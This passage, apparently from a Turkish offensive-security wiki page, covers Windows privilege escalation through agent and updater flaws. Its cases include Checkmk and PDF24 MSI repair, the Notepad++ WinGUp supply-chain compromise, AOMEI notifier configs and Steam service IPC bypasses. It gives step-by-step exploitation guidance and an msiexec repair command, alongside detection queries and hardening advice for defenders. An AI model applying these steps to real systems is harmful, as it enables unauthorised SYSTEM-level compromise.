    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operasyonel notlar:
- `qwinsta`, `msiexec /fa` etkileşimsiz bir WinRM kabuğunda başarısız olduğunda ve mevcut bir masaüstü/bağlantısı kesilmiş oturumun onarımı doğru şekilde tetikleyip tetikleyemeyeceğini anlamanız gerektiğinde faydalıdır.<sup>[[7]](#references)</sup>
- Bu örüntü, **herkesin yazabildiği konumlarda geçici betikler hazırlayıp daha sonra bunları SYSTEM olarak çalıştıran** diğer endpoint agent'ları ve updater'lar için de geçerlidir. Tahmin edilebilir adları, exclusive create semantiğinin eksikliğini ve isteğe bağlı olarak tetiklenebilen onarım/güncelleme akışlarını test edin.

### Etkileşimli installer onarımı ve ayrıcalıklı konsol

PDF24 Creator 11.15.1, ayrı bir MSI onarım riskini gösterir: yazıcı yükleme custom action'ı, onarım sırasında SYSTEM haklarıyla görünür bir konsol başlatabilir. Üretici, bu davranışı gidermek için MSI installer'ını 11.15.2'de değiştirdi. Ürünün eski bir sürümü yalnızca bir triage ipucudur. Kayıtlı veya erişilebilir MSI paketini, bu kullanıcının onarımı başlatıp başlatamayacağını, güvenlik açığı bulunan custom action'ın ve günlük dosyası gecikmesinin mevcut olup olmadığını ve etkileşimli bir masaüstünün konsolu gösterip gösteremeyeceğini kontrol edin. Bildirilen gecikmede `faxPrnInst.log` üzerinde bir oplock kullanılmıştır; dosyanın sıradan şekilde yazılabilir olması tek erişim koşulu değildir. Etkileşimsiz bir kabuk, erişilemeyen bir paket veya yamalı bir installer zinciri bozabilir. Bu sorun `AlwaysInstallElevated`'a bağlı değildir ve tahmin edilebilir bir geçici betiği değiştirmekten farklıdır.

---
## Zayıf updater doğrulamasıyla uzaktan tedarik zinciri ele geçirme (WinGUp / Notepad++)

Haziran 2025 ile Aralık 2025 arasında, Notepad++ güncelleme akışının arkasındaki barındırma altyapısını ele geçiren saldırganlar, seçtikleri kurbanlara kötü amaçlı manifest'leri hedefli olarak sundu. Eski WinGUp tabanlı updater'lar güncelleme özgünlüğünü tam olarak doğrulamıyordu; bu nedenle kötü amaçlı bir XML yanıtı, istemcileri saldırganların kontrolündeki URL'lere yönlendirebiliyordu. İstemci, HTTPS içeriğini güvenilir bir sertifika zincirini ve indirilen installer'ın geçerli PE imzasını birlikte zorunlu kılmadan kabul ettiğinden kurbanlar trojan'laştırılmış bir NSIS `update.exe` dosyasını indirip çalıştırdı.<sup>[[12]](#references)[[13]](#references)</sup>

Operasyonel akış (yerel exploit gerekmez):
1. **Altyapı müdahalesi**: CDN/barındırma altyapısını ele geçirip güncelleme kontrollerine, kötü amaçlı bir indirme URL'sini gösteren saldırgan metadata'sıyla yanıt verin.
2. **Trojan'laştırılmış NSIS**: Installer bir payload indirip çalıştırır ve iki execution chain'den yararlanır:
   - **Kendi imzalı binary'sini getir + sideload**: İmzalı Bitdefender `BluetoothService.exe` dosyasını pakete ekleyip arama yoluna kötü amaçlı bir `log.dll` bırakın. İmzalı binary çalıştığında Windows, `log.dll` dosyasını sideload eder; bu DLL, Chrysalis backdoor'unu çözüp reflectively yükler (statik tespiti zorlaştırmak için Warbird koruması ve API hashing kullanılır).
   - **Betiklenmiş shellcode injection**: NSIS, shellcode enjekte edip Cobalt Strike Beacon'ı hazırlamak için Win32 API'lerini (ör. `EnumWindowStationsW`) kullanan derlenmiş bir Lua betiğini çalıştırır.<sup>[[12]](#references)</sup>

Herhangi bir auto-updater için hardening/tespit çıkarımları:
- İndirilen installer için **sertifika + imza doğrulamasını** zorunlu kılın (üreticinin imzalayan sertifikasını sabitleyin, eşleşmeyen CN/zinciri reddedin) ve güncelleme manifest'ini de imzalayın (ör. XMLDSig). Doğrulanmadıkları sürece manifest'in kontrol ettiği yönlendirmeleri engelleyin.
- **BYO imzalı binary sideloading**'i indirme sonrası bir tespit pivot'u olarak ele alın: imzalı bir üretici EXE'si canonical yükleme yolu dışındaki bir DLL adını yüklediğinde (ör. Bitdefender'ın Temp/Downloads konumundan `log.dll` yüklemesi) ve bir updater temp konumuna üretici imzası taşımayan installer'lar bırakıp çalıştırdığında uyarı verin.
- Bu zincirde gözlemlenen **kötü amaçlı yazılıma özgü artifact'leri** izleyin (genel pivot'lar olarak faydalıdır): `Global\Jdhfv_1.0.1` mutex'i, `%TEMP%` konumuna yapılan anormal `gup.exe` yazmaları ve Lua güdümlü shellcode injection aşamaları.
- Notepad++, v8.8.9 ve sonrasında WinGUp'ı güçlendirerek karşılık verdi: döndürülen XML artık imzalanıyor (XMLDSig) ve yeni sürümler, yalnızca aktarıma güvenmek yerine indirilen installer için sertifika + imza doğrulamasını zorunlu kılıyor.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender imzalı EXE'nin <code>log.dll</code> dosyasını sideload etmesi (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> bir Notepad++ olmayan yükleyiciyi başlatıyor</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Bu kalıplar, imzasız manifestleri kabul eden veya installer imzalayanlarını sabitlemeyen tüm updater'lar için geçerlidir: ağın ele geçirilmesi + malicious installer + BYO-signed sideloading, “güvenilir” güncellemeler kisvesi altında remote code execution sağlar.

### İkinci bir güncelleme tetikleyicisi olarak bildirim yapılandırması

Bir updater, **içeriği hazırlamak ve yürütülmesini tetiklemek** için ayrı remote yapılandırmalar kullanabilir. Bunun için yapılandırmaların veya yanıtlarının kontrol edilmesi gerekir; raporlar origin erişiminin nasıl elde edildiğini belirtmiyor. AOMEI vakasında `down_html.ini`, bir arşiv URL'si, sürüm (`thrid`) ve MD5 (`Val`) seçiyordu; saldırgan sürümü artırdı ve URL'yi eşleşen checksum ile birlikte değiştirdi. Bu, yukarıda ele alınan [metadata trust-boundary failure](#2-hijacking-the-update-channel-to-run-code-as-system) durumudur. Ek yürütme yolu olan `Notifycfg.ini`, `ABNotify.exe`'yi çıkarılmış `upgrade-now.html` dosyasını WebView'de yerel bir `file:///` URL'si üzerinden yüklemeye yönlendiriyordu. Sayfa otomatik olarak kardeş bir executable'a yönleniyor, WebView de bunu system shell'e iletiyordu. Alt süreç, notifier'ın ayrıcalıklarını devralıyordu; bu durum kendi başına SYSTEM ayrıcalığı sağlamıyordu.<sup>[[17]](#references)[[18]](#references)</sup>

Google ayrıca, istemcinin normal sürüm kontrolünü aşan 35.000'den fazla yinelenen sahte bölüm içeren, değiştirilmiş bir `Notifycfg.ini` bildirdi. Rapor, genel bir parser bypass olduğunu ortaya koymuyor. Saldırgan remote dosyaları beş ila on dakikalık aralıkların ardından geri yüklediğinden, yalnızca bu aralıklarda polling yapan istemciler değiştirilmiş yapılandırmayı aldı. Bu bildirim kanalı, arşivin yürütülmesini gerektirmeyen ayrı bir [WebDAV/NTLM coercion lure](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) da içeriyordu.<sup>[[18]](#references)</sup>

---
## Ayrıcalıklı hizmet IPC'sine shared-memory bootstrap

Named-pipe enumeration ile yetinmeyin. Bir SYSTEM broker, bağlantı kurulumu için izinleri geniş bir named **file mapping** sunabilir, ardından istek yapan sürece anonymous pipe handle'ları kopyalayabilir. Steam'in test edilen tasarımında `Global\SteamClientService_SharedMemFile` ve `Global\SteamClientService_SharedMemLock`, istemci PID/event handshake sürecini koordine eder; hizmet iki pipe handle döndürür ve sonraki length-prefixed isteklerde `RunInterface` (`0x01`) kullanılır. Mapping DACL'si, her integrity level'daki istemcilere izin veriyordu. `steamclient64.dll` içindeki dahili `CSteamServiceWin32` nesnesi pratik bir istemci sağlıyordu: build'e özgü global'i çözümleyin, vtable slot 0'daki `Connect`'i çağırın, ardından handshake'i yeniden uygulamak yerine interface map'lerini kullanın. IPC'ye erişmek yalnızca bir ön koşuldur; ayrıcalıklı handler'ın trust kararı, privilege escalation olup olmayacağını belirler. <sup>[[19]](#references)[[20]](#references)</sup>

### İmzalı manifest, eski executable allowlist'ine dönüşüyor

`IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21), imzalı bir VDF'nin `kvsignatures` değerini doğrular ancak değişmez bir dosya kimliği yerine **genişletilmiş executable pathname** değerini kaydeder. `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe` gibi imzalı bir `Run Process` girdisiyle, kullanıcı tarafından yazılabilir bir `%INSTALLDIR%` sağlayın. Tam olarak bu genişletilmiş yola bir replacement executable yerleştirin, ardından allowlist'e alınmış yolu belirten `Process 1` içeren imzasız bir VDF ile `RunInstallScript`'i (slot 22) çağırın. Girdi, hizmet yeniden başlatılana kadar imzalı script'in yürütülmesinden sonra da geçerliliğini korur; bildirilen uygulamada SYSTEM başlatmasından önce dosya yeniden doğrulanmaz. Yerleştirilen filename'i, yalnızca prerequisite kategorisiyle değil, gerçek imzalı girdiyle eşleştirin. <sup>[[19]](#references)[[20]](#references)</sup>

### Module-manager alt süreci, doğrudan yüklemedeki signature check'i atlıyor

`IClientModuleManager::LoadModule` (slot 0), sağlanan ID modülün CRC32 değeriyle eşleştiğinde module bytes değerini kabul eder. `flags & 8` içeren `CallFunctionAsync` (slot 3), Valve imzasını doğrulayan doğrudan reflective-load dalı yerine **child-process** dalını seçer. Hizmet, `legacycompat\servicecall_<CRC>.dll` dosyasını yazar ve kurulum dizininden `legacycompat\steamservice.exe /runfunc ...` komutunu başlatır. Bu dizin kullanıcı tarafından yazılabiliyorsa, belirtilen yola bir executable yerleştirin, CRC'si eşleşen herhangi bir throwaway module yükleyin ve async method'u bit 3 ayarlanmış şekilde çağırın. Bildirilen build'de alt executable ve diske yazılan DLL doğrulanmıyordu. Modülün kendisinin çalışan bir payload olması gerekmez: SYSTEM olarak çalıştırılan, yerine konmuş alt executable'dır. <sup>[[19]](#references)[[20]](#references)</sup>

### Ayrıcalıklı driver kurulumu öncesinde catalog-member kontrolleri

Bir driver-install broker için, catalog validation'ın **installer'a iletilen tam INF dosyasını** doğrulayıp doğrulamadığını kontrol edin. Bildirilen `InstallVrLinkDongleDriver` yolunda `WinVerifyTrust` bir catalog'u doğrular ve `CryptCATAdminCalcHashFromFileHandle`, çağıran tarafından sağlanan dizinde *en az bir* eşleşen dosya arar; ancak hizmet, bu INF'nin amaçlanan catalog üyesi olduğunu doğrulamadan `netrtwlanuval.inf` dosyasında `pnputil /add-driver ... /install` komutunu çalıştırır. Düz veya mimariye özgü bir dizin kabul edilir. Bu nedenle, eşleşen herhangi bir dizin üyesi içeren imzalı bir catalog, ayrıcalıklı installer'a iletilen INF farklı olsa bile hizmetin zayıf kontrolünü geçebilir. Bunun tek başına Windows driver-signing politikasını aştığını varsaymayın: başarılı kurulum yine de replacement package'a ve host politikasına bağlıdır. <sup>[[19]](#references)[[20]](#references)</sup>

Hizmet, `pnputil` INF'yi açmadan önce validation handle'larını serbest bırakır; böylece executable update yerine driver-installation sink içeren bir [TOCTOU gap](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) oluşur. Bir oplock, kontrol ile installer'ın dosyayı açması arasındaki değiştirme anını belirlemeyi sağlayabilir. Aynı IPC, ayrı consent ön koşullarına bağlı olarak [secure-desktop input forwarding](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring) özelliğini de sunar. <sup>[[19]](#references)</sup>

## References
- [1] [Danışma – Windows için Netskope Client – Rogue Server aracılığıyla Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Güvenlik Danışma Belgesi NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre ve Razer Synapse 4'ü ele geçirmek](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent'taki yazılabilir dosyalar aracılığıyla Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent'ta Privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC'leri](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Devlet destekli aktörler Notepad++ supply chain'ini istismar ediyor](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ele geçirilen altyapı olayına ilişkin güncelleme](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows için Netskope Client'ta CVE-2025-0309 düzeltmesini atlatma](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage'daki Privilege Escalation açıklarını ortaya çıkarma](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC'den SYSTEM'e](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper supply-chain ihlali](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group ve Mandiant – Geçici Supply Chain Değişikliklerini Araştırma](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Valve'ı ele geçirme](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – Turning the Valve PoC'leri](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
